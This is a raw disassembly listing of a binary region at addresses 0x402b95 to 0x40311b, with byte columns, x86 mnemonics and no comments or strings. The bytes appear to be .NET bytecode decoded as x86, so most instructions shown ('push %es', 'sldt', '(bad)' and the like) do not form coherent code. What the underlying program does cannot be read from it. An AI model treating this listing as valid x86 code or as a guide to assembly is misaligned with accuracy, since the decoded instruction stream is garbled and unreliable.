  402b95:	00 0a                	add    %cl,(%edx)
  402b97:	1a 6a 28             	sbb    0x28(%edx),%ch
  402b9a:	0d 00 00 06 28       	or     $0x28060000,%eax
  402b9f:	0c 00                	or     $0x0,%al
  402ba1:	00 06                	add    %al,(%esi)
  402ba3:	d4 8d                	aam    $0x8d
  402ba5:	44                   	inc    %esp
  402ba6:	00 00                	add    %al,(%eax)
  402ba8:	01 28                	add    %ebp,(%eax)
  402baa:	0b 00                	or     (%eax),%eax
  402bac:	00 06                	add    %al,(%esi)
  402bae:	16                   	push   %ss
  402baf:	6a 28                	push   $0x28
  402bb1:	0f 00 00             	sldt   (%eax)
  402bb4:	06                   	push   %es
  402bb5:	28 2f                	sub    %ch,(%edi)
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	06                   	push   %es
  402bba:	28 20                	sub    %ah,(%eax)
  402bbc:	00 00                	add    %al,(%eax)
  402bbe:	06                   	push   %es
  402bbf:	16                   	push   %ss
  402bc0:	28 18                	sub    %bl,(%eax)
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	06                   	push   %es
  402bc5:	16                   	push   %ss
  402bc6:	28 1a                	sub    %bl,(%edx)
  402bc8:	00 00                	add    %al,(%eax)
  402bca:	06                   	push   %es
  402bcb:	14 fe                	adc    $0xfe,%al
  402bcd:	06                   	push   %es
  402bce:	21 00                	and    %eax,(%eax)
  402bd0:	00 06                	add    %al,(%esi)
  402bd2:	73 3a                	jae    0x402c0e
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	0a 14 73             	or     (%ebx,%esi,2),%dl
  402bd9:	27                   	daa
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	0a 20                	or     (%eax),%ah
  402bde:	10 27                	adc    %ah,(%edi)
  402be0:	00 00                	add    %al,(%eax)
  402be2:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402be8:	32 00                	xor    (%eax),%al
  402bea:	00 0a                	add    %cl,(%edx)
  402bec:	73 27                	jae    0x402c15
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	0a 20                	or     (%eax),%ah
  402bf2:	10 27                	adc    %ah,(%edi)
  402bf4:	00 00                	add    %al,(%eax)
  402bf6:	20 98 3a 00 00 6f    	and    %bl,0x6f00003a(%eax)
  402bfc:	32 00                	xor    (%eax),%al
  402bfe:	00 0a                	add    %cl,(%edx)
  402c00:	73 3b                	jae    0x402c3d
  402c02:	00 00                	add    %al,(%eax)
  402c04:	0a 28                	or     (%eax),%ch
  402c06:	11 00                	adc    %eax,(%eax)
  402c08:	00 06                	add    %al,(%esi)
  402c0a:	14 fe                	adc    $0xfe,%al
  402c0c:	06                   	push   %es
  402c0d:	22 00                	and    (%eax),%al
  402c0f:	00 06                	add    %al,(%esi)
  402c11:	73 3a                	jae    0x402c4d
  402c13:	00 00                	add    %al,(%eax)
  402c15:	0a 14 17             	or     (%edi,%edx,1),%dl
  402c18:	17                   	pop    %ss
  402c19:	73 3b                	jae    0x402c56
  402c1b:	00 00                	add    %al,(%eax)
  402c1d:	0a 28                	or     (%eax),%ch
  402c1f:	16                   	push   %ss
  402c20:	00 00                	add    %al,(%eax)
  402c22:	06                   	push   %es
  402c23:	28 08                	sub    %cl,(%eax)
  402c25:	00 00                	add    %al,(%eax)
  402c27:	06                   	push   %es
  402c28:	28 0a                	sub    %cl,(%edx)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	06                   	push   %es
  402c2d:	28 0e                	sub    %cl,(%esi)
  402c2f:	00 00                	add    %al,(%eax)
  402c31:	06                   	push   %es
  402c32:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402c38:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402c3f:	06                   	push   %es
  402c40:	73 3c                	jae    0x402c7e
  402c42:	00 00                	add    %al,(%eax)
  402c44:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402c47:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402c4c:	38 06                	cmp    %al,(%esi)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	00 16                	add    %dl,(%esi)
  402c52:	28 13                	sub    %dl,(%ebx)
  402c54:	00 00                	add    %al,(%eax)
  402c56:	06                   	push   %es
  402c57:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402c5a:	00 00                	add    %al,(%eax)
  402c5c:	26 16                	es push %ss
  402c5e:	28 13                	sub    %dl,(%ebx)
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	dd 00                	fldl   (%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 2a                	add    %ch,(%edx)
  402c69:	00 00                	add    %al,(%eax)
  402c6b:	00 41 4c             	add    %al,0x4c(%ecx)
  402c6e:	00 00                	add    %al,(%eax)
  402c70:	00 00                	add    %al,(%eax)
  402c72:	00 00                	add    %al,(%eax)
  402c74:	ce                   	into
  402c75:	00 00                	add    %al,(%eax)
  402c77:	00 26                	add    %ah,(%esi)
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	00 f4                	add    %dh,%ah
  402c7d:	00 00                	add    %al,(%eax)
  402c7f:	00 06                	add    %al,(%esi)
  402c81:	00 00                	add    %al,(%eax)
  402c83:	00 01                	add    %al,(%ecx)
  402c85:	00 00                	add    %al,(%eax)
  402c87:	01 02                	add    %eax,(%edx)
  402c89:	00 00                	add    %al,(%eax)
  402c8b:	00 21                	add    %ah,(%ecx)
  402c8d:	01 00                	add    %eax,(%eax)
  402c8f:	00 82 00 00 00 a3    	add    %al,-0x5d000000(%edx)
  402c95:	01 00                	add    %eax,(%eax)
  402c97:	00 0f                	add    %cl,(%edi)
	...
  402ca5:	00 00                	add    %al,(%eax)
  402ca7:	00 e4                	add    %ah,%ah
  402ca9:	02 00                	add    (%eax),%al
  402cab:	00 e4                	add    %ah,%ah
  402cad:	02 00                	add    (%eax),%al
  402caf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	01 00                	add    %eax,(%eax)
  402cb6:	00 01                	add    %al,(%ecx)
  402cb8:	1b 30                	sbb    (%eax),%esi
  402cba:	02 00                	add    (%eax),%al
  402cbc:	6a 00                	push   $0x0
  402cbe:	00 00                	add    %al,(%eax)
  402cc0:	00 00                	add    %al,(%eax)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	28 08                	sub    %cl,(%eax)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	06                   	push   %es
  402cc9:	25 3a 06 00 00       	and    $0x63a,%eax
  402cce:	00 26                	add    %ah,(%esi)
  402cd0:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cd6:	40                   	inc    %eax
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	0a 28                	or     (%eax),%ch
  402cdb:	06                   	push   %es
  402cdc:	00 00                	add    %al,(%eax)
  402cde:	06                   	push   %es
  402cdf:	25 3a 06 00 00       	and    $0x63a,%eax
  402ce4:	00 26                	add    %ah,(%esi)
  402ce6:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402cec:	41                   	inc    %ecx
  402ced:	00 00                	add    %al,(%eax)
  402cef:	0a 28                	or     (%eax),%ch
  402cf1:	15 00 00 06 25       	adc    $0x25060000,%eax
  402cf6:	3a 06                	cmp    (%esi),%al
  402cf8:	00 00                	add    %al,(%eax)
  402cfa:	00 26                	add    %ah,(%esi)
  402cfc:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d02:	42                   	inc    %edx
  402d03:	00 00                	add    %al,(%eax)
  402d05:	0a 28                	or     (%eax),%ch
  402d07:	10 00                	adc    %al,(%eax)
  402d09:	00 06                	add    %al,(%esi)
  402d0b:	25 3a 06 00 00       	and    $0x63a,%eax
  402d10:	00 26                	add    %ah,(%esi)
  402d12:	38 05 00 00 00 28    	cmp    %al,0x28000000
  402d18:	42                   	inc    %edx
  402d19:	00 00                	add    %al,(%eax)
  402d1b:	0a dd                	or     %ch,%bl
  402d1d:	06                   	push   %es
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	00 26                	add    %ah,(%esi)
  402d22:	dd 00                	fldl   (%eax)
  402d24:	00 00                	add    %al,(%eax)
  402d26:	00 16                	add    %dl,(%esi)
  402d28:	28 13                	sub    %dl,(%ebx)
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	06                   	push   %es
  402d2d:	2a 00                	sub    (%eax),%al
  402d2f:	00 01                	add    %al,(%ecx)
  402d31:	10 00                	adc    %al,(%eax)
  402d33:	00 00                	add    %al,(%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	00 5d 5d             	add    %bl,0x5d(%ebp)
  402d3a:	00 06                	add    %al,(%esi)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 01                	add    %al,(%ecx)
  402d40:	1b 30                	sbb    (%eax),%esi
  402d42:	06                   	push   %es
  402d43:	00 ba 01 00 00 04    	add    %bh,0x4000001(%edx)
  402d49:	00 00                	add    %al,(%eax)
  402d4b:	11 28                	adc    %ebp,(%eax)
  402d4d:	06                   	push   %es
  402d4e:	00 00                	add    %al,(%eax)
  402d50:	06                   	push   %es
  402d51:	6f                   	outsl  %ds:(%esi),(%dx)
  402d52:	2b 00                	sub    (%eax),%eax
  402d54:	00 0a                	add    %cl,(%edx)
  402d56:	39 0a                	cmp    %ecx,(%edx)
  402d58:	00 00                	add    %al,(%eax)
  402d5a:	00 28                	add    %ch,(%eax)
  402d5c:	12 00                	adc    (%eax),%al
  402d5e:	00 06                	add    %al,(%esi)
  402d60:	3a 0b                	cmp    (%ebx),%cl
  402d62:	00 00                	add    %al,(%eax)
  402d64:	00 16                	add    %dl,(%esi)
  402d66:	28 13                	sub    %dl,(%ebx)
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	06                   	push   %es
  402d6b:	dd 95 01 00 00 28    	fstl   0x28000001(%ebp)
  402d71:	08 00                	or     %al,(%eax)
  402d73:	00 06                	add    %al,(%esi)
  402d75:	02 6f 43             	add    0x43(%edi),%ch
  402d78:	00 00                	add    %al,(%eax)
  402d7a:	0a 0a                	or     (%edx),%cl
  402d7c:	06                   	push   %es
  402d7d:	16                   	push   %ss
  402d7e:	3e 6b 01 00          	imul   $0x0,%ds:(%ecx),%eax
  402d82:	00 28                	add    %ch,(%eax)
  402d84:	0e                   	push   %cs
  402d85:	00 00                	add    %al,(%eax)
  402d87:	06                   	push   %es
  402d88:	06                   	push   %es
  402d89:	6a 58                	push   $0x58
  402d8b:	28 0f                	sub    %cl,(%edi)
  402d8d:	00 00                	add    %al,(%eax)
  402d8f:	06                   	push   %es
  402d90:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402d93:	00 06                	add    %al,(%esi)
  402d95:	06                   	push   %es
  402d96:	6a 59                	push   $0x59
  402d98:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402d9e:	0c 00                	or     $0x0,%al
  402da0:	00 06                	add    %al,(%esi)
  402da2:	3a 02                	cmp    (%edx),%al
  402da4:	01 00                	add    %eax,(%eax)
  402da6:	00 28                	add    %ch,(%eax)
  402da8:	0a 00                	or     (%eax),%al
  402daa:	00 06                	add    %al,(%esi)
  402dac:	16                   	push   %ss
  402dad:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  402db1:	0a 6a 28             	or     0x28(%edx),%ch
  402db4:	0d 00 00 06 28       	or     $0x28060000,%eax
  402db9:	0c 00                	or     $0x0,%al
  402dbb:	00 06                	add    %al,(%esi)
  402dbd:	16                   	push   %ss
  402dbe:	6a 3e                	push   $0x3e
  402dc0:	c2 00 00             	ret    $0x0
  402dc3:	00 16                	add    %dl,(%esi)
  402dc5:	6a 28                	push   $0x28
  402dc7:	0f 00 00             	sldt   (%eax)
  402dca:	06                   	push   %es
  402dcb:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402dce:	00 06                	add    %al,(%esi)
  402dd0:	d4 8d                	aam    $0x8d
  402dd2:	44                   	inc    %esp
  402dd3:	00 00                	add    %al,(%eax)
  402dd5:	01 28                	add    %ebp,(%eax)
  402dd7:	0b 00                	or     (%eax),%eax
  402dd9:	00 06                	add    %al,(%esi)
  402ddb:	38 5f 00             	cmp    %bl,0x0(%edi)
  402dde:	00 00                	add    %al,(%eax)
  402de0:	28 08                	sub    %cl,(%eax)
  402de2:	00 00                	add    %al,(%eax)
  402de4:	06                   	push   %es
  402de5:	28 0a                	sub    %cl,(%edx)
  402de7:	00 00                	add    %al,(%eax)
  402de9:	06                   	push   %es
  402dea:	28 0e                	sub    %cl,(%esi)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	06                   	push   %es
  402def:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402df5:	69 6f 45 00 00 0a 0b 	imul   $0xb0a0000,0x45(%edi),%ebp
  402dfc:	07                   	pop    %es
  402dfd:	16                   	push   %ss
  402dfe:	3d 0b 00 00 00       	cmp    $0xb,%eax
  402e03:	16                   	push   %ss
  402e04:	28 13                	sub    %dl,(%ebx)
  402e06:	00 00                	add    %al,(%eax)
  402e08:	06                   	push   %es
  402e09:	dd f7                	(bad)
  402e0b:	00 00                	add    %al,(%eax)
  402e0d:	00 28                	add    %ch,(%eax)
  402e0f:	0e                   	push   %cs
  402e10:	00 00                	add    %al,(%eax)
  402e12:	06                   	push   %es
  402e13:	07                   	pop    %es
  402e14:	6a 58                	push   $0x58
  402e16:	28 0f                	sub    %cl,(%edi)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	06                   	push   %es
  402e1b:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  402e1e:	00 06                	add    %al,(%esi)
  402e20:	07                   	pop    %es
  402e21:	6a 59                	push   $0x59
  402e23:	28 0d 00 00 06 28    	sub    %cl,0x28060000
  402e29:	0c 00                	or     $0x0,%al
  402e2b:	00 06                	add    %al,(%esi)
  402e2d:	16                   	push   %ss
  402e2e:	6a 3c                	push   $0x3c
  402e30:	0b 00                	or     (%eax),%eax
  402e32:	00 00                	add    %al,(%eax)
  402e34:	16                   	push   %ss
  402e35:	28 13                	sub    %dl,(%ebx)
  402e37:	00 00                	add    %al,(%eax)
  402e39:	06                   	push   %es
  402e3a:	dd c6                	ffree  %st(6)
  402e3c:	00 00                	add    %al,(%eax)
  402e3e:	00 28                	add    %ch,(%eax)
  402e40:	0c 00                	or     $0x0,%al
  402e42:	00 06                	add    %al,(%esi)
  402e44:	16                   	push   %ss
  402e45:	6a 30                	push   $0x30
  402e47:	98                   	cwtl
  402e48:	14 fe                	adc    $0xfe,%al
  402e4a:	06                   	push   %es
  402e4b:	46                   	inc    %esi
  402e4c:	00 00                	add    %al,(%eax)
  402e4e:	06                   	push   %es
  402e4f:	73 46                	jae    0x402e97
  402e51:	00 00                	add    %al,(%eax)
  402e53:	0a 73 47             	or     0x47(%ebx),%dh
  402e56:	00 00                	add    %al,(%eax)
  402e58:	0a 28                	or     (%eax),%ch
  402e5a:	0a 00                	or     (%eax),%al
  402e5c:	00 06                	add    %al,(%esi)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	48                   	dec    %eax
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 16                	or     (%esi),%dl
  402e64:	6a 28                	push   $0x28
  402e66:	0f 00 00             	sldt   (%eax)
  402e69:	06                   	push   %es
  402e6a:	1a 6a 28             	sbb    0x28(%edx),%ch
  402e6d:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e72:	0c 00                	or     $0x0,%al
  402e74:	00 06                	add    %al,(%esi)
  402e76:	d4 8d                	aam    $0x8d
  402e78:	44                   	inc    %esp
  402e79:	00 00                	add    %al,(%eax)
  402e7b:	01 28                	add    %ebp,(%eax)
  402e7d:	0b 00                	or     (%eax),%eax
  402e7f:	00 06                	add    %al,(%esi)
  402e81:	38 3a                	cmp    %bh,(%edx)
  402e83:	00 00                	add    %al,(%eax)
  402e85:	00 1a                	add    %bl,(%edx)
  402e87:	6a 28                	push   $0x28
  402e89:	0d 00 00 06 28       	or     $0x28060000,%eax
  402e8e:	0c 00                	or     $0x0,%al
  402e90:	00 06                	add    %al,(%esi)
  402e92:	d4 8d                	aam    $0x8d
  402e94:	44                   	inc    %esp
  402e95:	00 00                	add    %al,(%eax)
  402e97:	01 28                	add    %ebp,(%eax)
  402e99:	0b 00                	or     (%eax),%eax
  402e9b:	00 06                	add    %al,(%esi)
  402e9d:	16                   	push   %ss
  402e9e:	6a 28                	push   $0x28
  402ea0:	0f 00 00             	sldt   (%eax)
  402ea3:	06                   	push   %es
  402ea4:	38 17                	cmp    %dl,(%edi)
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	00 28                	add    %ch,(%eax)
  402eaa:	0c 00                	or     $0x0,%al
  402eac:	00 06                	add    %al,(%esi)
  402eae:	16                   	push   %ss
  402eaf:	6a 3c                	push   $0x3c
  402eb1:	0b 00                	or     (%eax),%eax
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	16                   	push   %ss
  402eb6:	28 13                	sub    %dl,(%ebx)
  402eb8:	00 00                	add    %al,(%eax)
  402eba:	06                   	push   %es
  402ebb:	dd 45 00             	fldl   0x0(%ebp)
  402ebe:	00 00                	add    %al,(%eax)
  402ec0:	28 08                	sub    %cl,(%eax)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	06                   	push   %es
  402ec5:	28 0a                	sub    %cl,(%edx)
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	06                   	push   %es
  402eca:	28 0e                	sub    %cl,(%esi)
  402ecc:	00 00                	add    %al,(%eax)
  402ece:	06                   	push   %es
  402ecf:	69 28 0c 00 00 06    	imul   $0x600000c,(%eax),%ebp
  402ed5:	69 14 fe 06 1f 00 00 	imul   $0x1f06,(%esi,%edi,8),%edx
  402edc:	06                   	push   %es
  402edd:	73 3c                	jae    0x402f1b
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ee4:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402ee9:	38 06                	cmp    %al,(%esi)
  402eeb:	00 00                	add    %al,(%eax)
  402eed:	00 16                	add    %dl,(%esi)
  402eef:	28 13                	sub    %dl,(%ebx)
  402ef1:	00 00                	add    %al,(%eax)
  402ef3:	06                   	push   %es
  402ef4:	dd 0c 00             	fisttpll (%eax,%eax,1)
  402ef7:	00 00                	add    %al,(%eax)
  402ef9:	26 16                	es push %ss
  402efb:	28 13                	sub    %dl,(%ebx)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	06                   	push   %es
  402f00:	dd 00                	fldl   (%eax)
  402f02:	00 00                	add    %al,(%eax)
  402f04:	00 2a                	add    %ch,(%edx)
  402f06:	00 00                	add    %al,(%eax)
  402f08:	41                   	inc    %ecx
  402f09:	1c 00                	sbb    $0x0,%al
	...
  402f13:	00 ad 01 00 00 ad    	add    %ch,-0x52ffffff(%ebp)
  402f19:	01 00                	add    %eax,(%eax)
  402f1b:	00 0c 00             	add    %cl,(%eax,%eax,1)
  402f1e:	00 00                	add    %al,(%eax)
  402f20:	01 00                	add    %eax,(%eax)
  402f22:	00 01                	add    %al,(%ecx)
  402f24:	1b 30                	sbb    (%eax),%esi
  402f26:	04 00                	add    $0x0,%al
  402f28:	04 01                	add    $0x1,%al
  402f2a:	00 00                	add    %al,(%eax)
  402f2c:	05 00 00 11 28       	add    $0x28110000,%eax
  402f31:	14 00                	adc    $0x0,%al
  402f33:	00 06                	add    %al,(%esi)
  402f35:	0a 16                	or     (%esi),%dl
  402f37:	0b 06                	or     (%esi),%eax
  402f39:	12 01                	adc    (%ecx),%al
  402f3b:	28 49 00             	sub    %cl,0x0(%ecx)
  402f3e:	00 0a                	add    %cl,(%edx)
  402f40:	28 12                	sub    %dl,(%edx)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	06                   	push   %es
  402f45:	3a 05 00 00 00 dd    	cmp    0xdd000000,%al
  402f4b:	e4 00                	in     $0x0,%al
  402f4d:	00 00                	add    %al,(%eax)
  402f4f:	02 8e 69 28 4a 00    	add    0x4a2869(%esi),%cl
  402f55:	00 0a                	add    %cl,(%edx)
  402f57:	0c 28                	or     $0x28,%al
  402f59:	06                   	push   %es
  402f5a:	00 00                	add    %al,(%eax)
  402f5c:	06                   	push   %es
  402f5d:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402f62:	00 0a                	add    %cl,(%edx)
  402f64:	26 28 08             	sub    %cl,%es:(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	06                   	push   %es
  402f6a:	08 16                	or     %dl,(%esi)
  402f6c:	08 8e 69 6f 4c 00    	or     %cl,0x4c6f69(%esi)
  402f72:	00 0a                	add    %cl,(%edx)
  402f74:	02 8e 69 20 40 42    	add    0x42402069(%esi),%cl
  402f7a:	0f 00                	(bad)
  402f7c:	3e 6e                	outsb  %ds:(%esi),(%dx)
  402f7e:	00 00                	add    %al,(%eax)
  402f80:	00 02                	add    %al,(%edx)
  402f82:	73 4d                	jae    0x402fd1
  402f84:	00 00                	add    %al,(%eax)
  402f86:	0a 0d 16 13 04 09    	or     0x9041316,%cl
  402f8c:	16                   	push   %ss
  402f8d:	6a 6f                	push   $0x6f
  402f8f:	4e                   	dec    %esi
  402f90:	00 00                	add    %al,(%eax)
  402f92:	0a 20                	or     (%eax),%ah
  402f94:	50                   	push   %eax
  402f95:	c3                   	ret
  402f96:	00 00                	add    %al,(%eax)
  402f98:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  402f9c:	01 13                	add    %edx,(%ebx)
  402f9e:	05 38 26 00 00       	add    $0x2638,%eax
  402fa3:	00 28                	add    %ch,(%eax)
  402fa5:	06                   	push   %es
  402fa6:	00 00                	add    %al,(%eax)
  402fa8:	06                   	push   %es
  402fa9:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402fae:	00 0a                	add    %cl,(%edx)
  402fb0:	26 28 08             	sub    %cl,%es:(%eax)
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	06                   	push   %es
  402fb6:	11 05 16 11 04 6f    	adc    %eax,0x6f041116
  402fbc:	4c                   	dec    %esp
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	0a 28                	or     (%eax),%ch
  402fc1:	08 00                	or     %al,(%eax)
  402fc3:	00 06                	add    %al,(%esi)
  402fc5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fc6:	4f                   	dec    %edi
  402fc7:	00 00                	add    %al,(%eax)
  402fc9:	0a 09                	or     (%ecx),%cl
  402fcb:	11 05 16 11 05 8e    	adc    %eax,0x8e051116
  402fd1:	69 6f 45 00 00 0a 25 	imul   $0x250a0000,0x45(%edi),%ebp
  402fd8:	13 04 16             	adc    (%esi,%edx,1),%eax
  402fdb:	30 c7                	xor    %al,%bh
  402fdd:	dd 33                	fnsave (%ebx)
  402fdf:	00 00                	add    %al,(%eax)
  402fe1:	00 09                	add    %cl,(%ecx)
  402fe3:	39 06                	cmp    %eax,(%esi)
  402fe5:	00 00                	add    %al,(%eax)
  402fe7:	00 09                	add    %cl,(%ecx)
  402fe9:	6f                   	outsl  %ds:(%esi),(%dx)
  402fea:	33 00                	xor    (%eax),%eax
  402fec:	00 0a                	add    %cl,(%edx)
  402fee:	dc 28                	fsubrl (%eax)
  402ff0:	06                   	push   %es
  402ff1:	00 00                	add    %al,(%eax)
  402ff3:	06                   	push   %es
  402ff4:	15 17 6f 4b 00       	adc    $0x4b6f17,%eax
  402ff9:	00 0a                	add    %cl,(%edx)
  402ffb:	26 28 08             	sub    %cl,%es:(%eax)
  402ffe:	00 00                	add    %al,(%eax)
  403000:	06                   	push   %es
  403001:	02 16                	add    (%esi),%dl
  403003:	02 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%cl
  403009:	00 0a                	add    %cl,(%edx)
  40300b:	28 08                	sub    %cl,(%eax)
  40300d:	00 00                	add    %al,(%eax)
  40300f:	06                   	push   %es
  403010:	6f                   	outsl  %ds:(%esi),(%dx)
  403011:	4f                   	dec    %edi
  403012:	00 00                	add    %al,(%eax)
  403014:	0a dd                	or     %ch,%bl
  403016:	19 00                	sbb    %eax,(%eax)
  403018:	00 00                	add    %al,(%eax)
  40301a:	26 16                	es push %ss
  40301c:	28 13                	sub    %dl,(%ebx)
  40301e:	00 00                	add    %al,(%eax)
  403020:	06                   	push   %es
  403021:	dd 0d 00 00 00 07    	fisttpll 0x7000000
  403027:	39 06                	cmp    %eax,(%esi)
  403029:	00 00                	add    %al,(%eax)
  40302b:	00 06                	add    %al,(%esi)
  40302d:	28 50 00             	sub    %dl,0x0(%eax)
  403030:	00 0a                	add    %cl,(%edx)
  403032:	dc 2a                	fsubrl (%edx)
  403034:	01 28                	add    %ebp,(%eax)
  403036:	00 00                	add    %al,(%eax)
  403038:	02 00                	add    (%eax),%al
  40303a:	58                   	pop    %eax
  40303b:	00 5a b2             	add    %bl,-0x4e(%edx)
  40303e:	00 0d 00 00 00 00    	add    %cl,0x0
  403044:	00 00                	add    %al,(%eax)
  403046:	10 00                	adc    %al,(%eax)
  403048:	da ea                	(bad)
  40304a:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40304d:	00 00                	add    %al,(%eax)
  40304f:	01 02                	add    %eax,(%edx)
  403051:	00 08                	add    %cl,(%eax)
  403053:	00 ee                	add    %ch,%dh
  403055:	f6 00 0d             	testb  $0xd,(%eax)
  403058:	00 00                	add    %al,(%eax)
  40305a:	00 00                	add    %al,(%eax)
  40305c:	1b 30                	sbb    (%eax),%esi
  40305e:	03 00                	add    (%eax),%eax
  403060:	50                   	push   %eax
  403061:	00 00                	add    %al,(%eax)
  403063:	00 00                	add    %al,(%eax)
  403065:	00 00                	add    %al,(%eax)
  403067:	00 73 94             	add    %dh,-0x6c(%ebx)
  40306a:	00 00                	add    %al,(%eax)
  40306c:	06                   	push   %es
  40306d:	25 72 7a 21 00       	and    $0x217a72,%eax
  403072:	70 6f                	jo     0x4030e3
  403074:	7f 00                	jg     0x403076
  403076:	00 06                	add    %al,(%esi)
  403078:	72 88                	jb     0x403002
  40307a:	21 00                	and    %eax,(%eax)
  40307c:	70 6f                	jo     0x4030ed
  40307e:	8c 00                	mov    %es,(%eax)
  403080:	00 06                	add    %al,(%esi)
  403082:	25 72 92 21 00       	and    $0x219272,%eax
  403087:	70 6f                	jo     0x4030f8
  403089:	7f 00                	jg     0x40308b
  40308b:	00 06                	add    %al,(%esi)
  40308d:	28 35 00 00 06 6f    	sub    %dh,0x6f060000
  403093:	8c 00                	mov    %es,(%eax)
  403095:	00 06                	add    %al,(%esi)
  403097:	6f                   	outsl  %ds:(%esi),(%dx)
  403098:	89 00                	mov    %eax,(%eax)
  40309a:	00 06                	add    %al,(%esi)
  40309c:	28 20                	sub    %ah,(%eax)
  40309e:	00 00                	add    %al,(%eax)
  4030a0:	06                   	push   %es
  4030a1:	28 51 00             	sub    %dl,0x0(%ecx)
  4030a4:	00 0a                	add    %cl,(%edx)
  4030a6:	17                   	pop    %ss
  4030a7:	28 1a                	sub    %bl,(%edx)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	06                   	push   %es
  4030ac:	dd 06                	fldl   (%esi)
  4030ae:	00 00                	add    %al,(%eax)
  4030b0:	00 26                	add    %ah,(%esi)
  4030b2:	dd 00                	fldl   (%eax)
  4030b4:	00 00                	add    %al,(%eax)
  4030b6:	00 2a                	add    %ch,(%edx)
  4030b8:	01 10                	add    %edx,(%eax)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	00 00                	add    %al,(%eax)
  4030be:	00 00                	add    %al,(%eax)
  4030c0:	49                   	dec    %ecx
  4030c1:	49                   	dec    %ecx
  4030c2:	00 06                	add    %al,(%esi)
  4030c4:	01 00                	add    %eax,(%eax)
  4030c6:	00 01                	add    %al,(%ecx)
  4030c8:	1b 30                	sbb    (%eax),%esi
  4030ca:	02 00                	add    (%eax),%al
  4030cc:	2c 00                	sub    $0x0,%al
  4030ce:	00 00                	add    %al,(%eax)
  4030d0:	00 00                	add    %al,(%eax)
  4030d2:	00 00                	add    %al,(%eax)
  4030d4:	28 19                	sub    %bl,(%ecx)
  4030d6:	00 00                	add    %al,(%eax)
  4030d8:	06                   	push   %es
  4030d9:	39 16                	cmp    %edx,(%esi)
  4030db:	00 00                	add    %al,(%eax)
  4030dd:	00 28                	add    %ch,(%eax)
  4030df:	12 00                	adc    (%eax),%al
  4030e1:	00 06                	add    %al,(%esi)
  4030e3:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4030e6:	00 00                	add    %al,(%eax)
  4030e8:	28 17                	sub    %dl,(%edi)
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	06                   	push   %es
  4030ed:	17                   	pop    %ss
  4030ee:	58                   	pop    %eax
  4030ef:	28 18                	sub    %bl,(%eax)
  4030f1:	00 00                	add    %al,(%eax)
  4030f3:	06                   	push   %es
  4030f4:	dd 06                	fldl   (%esi)
  4030f6:	00 00                	add    %al,(%eax)
  4030f8:	00 26                	add    %ah,(%esi)
  4030fa:	dd 00                	fldl   (%eax)
  4030fc:	00 00                	add    %al,(%eax)
  4030fe:	00 2a                	add    %ch,(%edx)
  403100:	01 10                	add    %edx,(%eax)
  403102:	00 00                	add    %al,(%eax)
  403104:	00 00                	add    %al,(%eax)
  403106:	00 00                	add    %al,(%eax)
  403108:	25 25 00 06 01       	and    $0x1060025,%eax
  40310d:	00 00                	add    %al,(%eax)
  40310f:	01 1b                	add    %ebx,(%ebx)
  403111:	30 05 00 76 02 00    	xor    %al,0x27600
  403117:	00 06                	add    %al,(%esi)
  403119:	00 00                	add    %al,(%eax)
  40311b:	11 7e 05             	adc    %edi,0x5(%esi)
